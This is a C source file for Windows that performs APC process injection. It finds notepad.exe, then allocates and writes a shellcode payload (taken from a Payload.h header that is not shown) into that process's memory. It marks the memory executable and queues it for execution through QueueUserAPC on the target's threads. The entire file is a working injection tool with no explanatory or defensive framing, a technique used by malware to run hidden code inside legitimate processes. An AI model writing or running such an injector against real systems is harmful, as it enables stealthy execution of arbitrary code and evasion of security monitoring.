#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <winnt.h>
#include "Payload.h"

DWORD FindPID( LPCSTR procName ) {

    HANDLE hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
    if ( hSnapshot == INVALID_HANDLE_VALUE ) {
        fprintf( stderr, "[-] CreateToolhelp32Snapshot failed. Error: %d\n", GetLastError() );
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof( PROCESSENTRY32 );

    DWORD pid = 0;

    if ( Process32First( hSnapshot, &pe32 ) ) {
        do {
            if ( strcmp( pe32.szExeFile, procName ) == 0 ) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while ( Process32Next( hSnapshot, &pe32 ) );
    }

    CloseHandle( hSnapshot );
    return pid;
}

BOOL ApcInject( DWORD pid, LPVOID pRemoteFunc ) {

    HANDLE hThreadSnap = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 );
    if ( hThreadSnap == INVALID_HANDLE_VALUE ) {
        printf( "[-] CreateToolhelp32Snapshot failed. Error: %d\n", GetLastError() );
        return FALSE;
    }

    THREADENTRY32 te32;
    te32.dwSize = sizeof( THREADENTRY32 );

    BOOL Queued = FALSE;

    if ( Thread32First( hThreadSnap, &te32 ) ) {
        do {
            if ( te32.th32OwnerProcessID == pid ) {
                // dwThreadId = te32.th32ThreadID;
                HANDLE hThread = OpenThread( THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID );
                if ( !hThread ) continue;

                if ( QueueUserAPC( ( PAPCFUNC )pRemoteFunc, hThread, NULL ) ) {
                    printf( "[+] QueueUserAPC succeeded for thread ID: %d\n", te32.th32ThreadID );
                    Queued = TRUE;
                }
                CloseHandle( hThread );
            }
        } while ( Thread32Next( hThreadSnap, &te32 ) );
    }


    CloseHandle( hThreadSnap );

    return Queued;
}

int main( void ) {

    LPCSTR procName = "notepad.exe";
    DWORD pid = FindPID( procName );
    if ( !pid ) {
        fprintf( stderr, "[-] Could not find process: %s\n", procName );
        return 1;
    }

    printf( "[+] Found process %s with PID: %d\n", procName, pid );

    HANDLE hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid );

    if ( !hProcess ) {
        fprintf( stderr, "[-] OpenProcess failed. Error: %d\n", GetLastError() );
        return 1;
    }

    LPVOID pRemoteFunc = VirtualAllocEx( hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

    if ( pRemoteFunc == NULL ) {
        fprintf( stderr, "[-] VirtualAllocEx failed. Error: %d\n", GetLastError() );
        CloseHandle( hProcess );
        return 1;
    }

    printf( "[+] Allocated %ld bytes at %p in remote process.\n", payloadSize, pRemoteFunc );

    SIZE_T bytesWritten;
    if ( !WriteProcessMemory( hProcess, pRemoteFunc, payload, payloadSize, &bytesWritten ) || bytesWritten != payloadSize ) {
        fprintf( stderr, "[-] WriteProcessMemory failed. Error: %d\n", GetLastError() );
        VirtualFreeEx( hProcess, pRemoteFunc, 0, MEM_RELEASE );
        CloseHandle( hProcess );
        return 1;
    }

    printf( "[+] Wrote %zu bytes to remote process.\n", bytesWritten );

    DWORD oldProtect;
    if ( !VirtualProtectEx( hProcess, pRemoteFunc, payloadSize, PAGE_EXECUTE_READ, &oldProtect ) ) {
        fprintf( stderr, "[-] VirtualProtectEx failed. Error: %d\n", GetLastError() );
        VirtualFreeEx( hProcess, pRemoteFunc, 0, MEM_RELEASE );
        CloseHandle( hProcess );
        return 1;
    }

    if ( !ApcInject( pid, ( LPVOID )pRemoteFunc ) ) {
        fprintf( stderr, "[-] ApcInject failed.\n" );
        VirtualFreeEx( hProcess, pRemoteFunc, 0, MEM_RELEASE );
        CloseHandle( hProcess );
        return 1;
    }

    printf( "[+] APC injection successful. Payload queued for execution.\n" );

    Sleep( 5000 );

    VirtualFreeEx( hProcess, pRemoteFunc, 0, MEM_RELEASE );
    CloseHandle( hProcess );

    return 0;
}
